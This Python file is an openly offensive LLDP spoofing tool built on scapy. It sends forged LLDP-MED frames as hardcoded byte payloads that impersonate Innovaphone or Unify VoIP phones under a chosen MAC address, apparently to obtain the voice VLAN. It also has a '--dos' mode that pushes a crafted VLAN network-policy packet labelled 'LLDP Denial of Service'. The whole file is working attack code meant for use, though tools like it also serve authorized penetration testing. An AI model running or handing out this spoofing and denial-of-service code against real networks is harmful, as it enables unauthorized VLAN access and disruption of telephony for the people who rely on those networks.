#!/usr/bin/env python3

import sys
import argparse
import os, subprocess 
import binascii
import re, uuid
from scapy.all import *


parser = argparse.ArgumentParser(
    description="LLDP-Spoofing Tool"
)

parser.add_argument(
    '-V',
    dest="VENDOR",
    type=str,
    help="The specific vendor. Possible options are \"innovaphone\", \"unify\" ..."
)

parser.add_argument(
    '-m',
    dest="MAC",
    type=str,
    help="The MAC address which is used to spoof."
)

parser.add_argument(
    '-D',
    dest="DEVICE",
    type=str,
    help="The device or model which is used to spoof."
)

parser.add_argument(
    '-i',
    dest="INT",
    type=str,
    help="The interface which will be used"
)

parser.add_argument(
    '-v',
    action='store_true',
    help="Verbose mode. Write possible response to pcap file and open it with wireshark"
)

parser.add_argument(
    '--dos',
    action='store_true',
    help="LLDP Denial of Service mode. In this mode a LLDP-MED packet with the VLAN parameter will be spoofed"
)

parser.add_argument(
    '--untag',
    action='store_true',
    help="Use this option in addition to the \"--dos\" option for untagging"
)


args = parser.parse_args()


if os.geteuid() != 0:
    exit("\033[1;31m[!]\033[0m You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")


def innovaphone():

    inno_macbytes = binascii.unhexlify(args.MAC.replace(":", ""))
    inno_devicebytes = (args.DEVICE.encode())
    inno_devicelen = (bytes([len(inno_devicebytes)]))
    inno_descriptlen = (bytes([(54 + len(inno_devicebytes))]))
    inno_serialnum = (args.MAC.replace(":", "").encode())
    inno_modellen = (bytes([(4 + len(inno_devicebytes))]))

    innovaphone_packet=(b'\x02\x12\x05\x02\xfe\x80\x00\x00\x00\x00\x00\x00\x02\x90\x33\xff' 
        b'\xfe\x2f\xb8\xe0\x04\x07\x03' + inno_macbytes + b'\x06\x02\x00'
        b'\x78\x08\x08\x4c\x41\x4e\x20\x50\x6f\x72\x74\x0a' + inno_devicelen + inno_devicebytes +  
        b'\x0c'+ inno_descriptlen + b'\x31\x32\x72\x32\x20\x73\x72\x32\x31\x20' + inno_devicebytes +  
        b'\x5b\x31\x32\x2e\x35\x35\x31\x37\x5d\x2c\x20\x42\x6f' 
        b'\x6f\x74\x63\x6f\x64\x65\x5b\x31\x32\x35\x35\x31\x37\x5d\x2c\x20' 
        b'\x48\x61\x72\x64\x77\x61\x72\x65\x5b\x31\x32\x31\x31\x5d\x20\x0e' 
        b'\x04\x00\x24\x00\x24\xfe\x09\x00\x12\x0f\x01\x03\x6c\x02\x00\x00' 
        b'\xfe\x07\x00\x12\xbb\x01\x00\x33\x03\xfe\x08\x00\x12\xbb\x02\x01' 
        b'\x80\x00\x00\xfe\x07\x00\x12\xbb\x04\x50\x00\x41\xfe\x08\x00\x12' 
        b'\xbb\x05\x31\x32\x31\x31\xfe\x0a\x00\x12\xbb\x06\x31\x32\x35\x35' 
        b'\x31\x37\xfe\x0a\x00\x12\xbb\x07\x31\x32\x35\x35\x31\x37\xfe\x10'
        b'\x00\x12\xbb\x08' + inno_serialnum +  
        b'\xfe\x0f\x00\x12\xbb\x09\x69\x6e\x6e\x6f\x76\x61\x70\x68\x6f\x6e' 
        b'\x65\xfe' + inno_modellen + b'\x00\x12\xbb\x0a' + inno_devicebytes + b'\xfe\x04\x00\x12' 
        b'\xbb\x0b\x00\x00\x09\x32')

    return innovaphone_packet


def unify():

    unify_macbytes = binascii.unhexlify(args.MAC.replace(":", ""))

    unify_packet=(b'\x02\x12\x05\x02\xfe\x80\x00\x00\x00\x00\x00\x00\x02\x1a\xe8\xff'
        b'\xfe\x79\x88\x23\x04\x07\x03' + unify_macbytes + b'\x06\x02\x00'
        b'\x78\x0e\x04\x00\x24\x00\x20\xfe\x09\x00\x12\x0f\x01\x03\x6c\x00'
        b'\x00\x10\xfe\x07\x00\x12\xbb\x01\x00\x13\x03\xfe\x08\x00\x12\xbb'
        b'\x02\x01\x80\x00\x00\xfe\x08\x00\x12\xbb\x02\x02\x80\x00\x00\xfe'
        b'\x08\x00\x12\xbb\x02\x06\x80\x00\x00\xfe\x07\x00\x12\xbb\x04\x41'
        b'\x00\x3e\x00\x00\x55\xe1')

    return unify_packet


def dos():

    if args.untag:
	    policy = b'\x00\x03\xae'

    else:
	    policy = b'\x60\xe1\xae'


    dos_macbytes = binascii.unhexlify(args.MAC.replace(":", ""))

    dos_packet=(b'\x02\x07' 
        b'\x04' + dos_macbytes + b'\x04\x02\x07\x31\x06\x02\x00\x78\x08'
        b'\x01\x31\x0a\x06\x53\x77\x69\x74\x63\x68\x0c\x16'
        b'\x4c\x4c\x44\x50\x20\x44\x65\x6e\x69\x61\x6c\x20\x6f\x66\x20\x53'
        b'\x65\x72\x76\x69\x63\x65\x0e\x04\x00\x14\x00\x04'
        b'\x10\x0c\x05\x01\x7f\x00\x00\x01\x02\x00\x00'
        b'\x00\x00\x00\xfe\x09\x00\x12\x0f\x01\x03\x6c\x00\x00\x10\xfe\x07'
        b'\x00\x12\xbb\x01\x00\x0f\x04\xfe\x08\x00\x12\xbb\x02\x01' + policy + 
        b'\xfe\x07\x00\x12\xbb\x04\x03\x00\x41\x00\x00')

    return dos_packet


def send_packet(packet):
    
    sendp(Ether(type=0x88cc, dst="01:80:c2:00:00:0e", src=args.MAC)/Raw(load=(packet)), iface=args.INT)
    
    print("\033[1;32m[+]\033[0m Packet spoofing success.")

    if args.v:
       
        print("\033[1;34m[*]\033[0m Waiting for possible response.")

        sniff(filter="ether proto 0x88cc", count=1, prn=handle_output, iface=args.INT)


def handle_output(output):

    print("\033[1;32m[+]\033[0m Response recived!") 

    wrpcap('sniffed.pcap', output)

    os.system("wireshark sniffed.pcap")
	



if args.VENDOR == "innovaphone":
    packet = innovaphone()

elif args.VENDOR == "unify":
    packet = unify()

elif args.dos:
    packet = dos()

else:
    packet = innovaphone()


send_packet(packet)

